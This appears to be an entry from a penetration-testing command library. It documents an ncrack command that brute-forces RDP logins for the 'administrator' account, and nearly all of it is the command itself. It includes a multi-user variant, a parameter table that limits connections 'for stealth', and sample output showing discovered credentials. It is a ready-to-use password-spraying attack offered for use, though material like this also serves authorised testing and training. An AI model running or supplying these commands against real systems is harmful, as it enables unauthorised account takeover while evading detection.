---
type: command
executor: bash
data: >-
  ncrack --connection-limit 1 -vv --user administrator -P password-file.txt
  rdp://10.10.10.10
platforms:
  - Linux
tags:
  - brute-force
  - rdp
verified: true
validated: true
---

# ncrack-rdp-brute-force

## Command

```bash
ncrack --connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
```

## Description

This command uses Ncrack to perform RDP brute-forcing with a limited connection rate, spraying passwords against a specified user to identify valid credentials slowly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --connection-limit 1 | Max simultaneous connections (1 for stealth) | Yes |
| -vv | Very verbose output | No |
| --user administrator | Single username | Yes |
| -P password-file.txt | Password list file | Yes |
| rdp://10.10.10.10 | Target protocol and IP | Yes |

## Examples

### Basic Usage

```bash
ncrack --connection-limit 1 -vv --user administrator -P passwords.txt rdp://10.10.10.10
```

### Multiple Users

```bash
ncrack --connection-limit 1 -vv -U users.txt -P passwords.txt rdp://10.10.10.10
```

## Expected Output

Discovered credentials on rdp://10.10.10.10:3389 'administrator:password123' [20]

## Related

- [[procedures/RDP-Service-Password-Spraying]]
- [[tools/ncrack]]
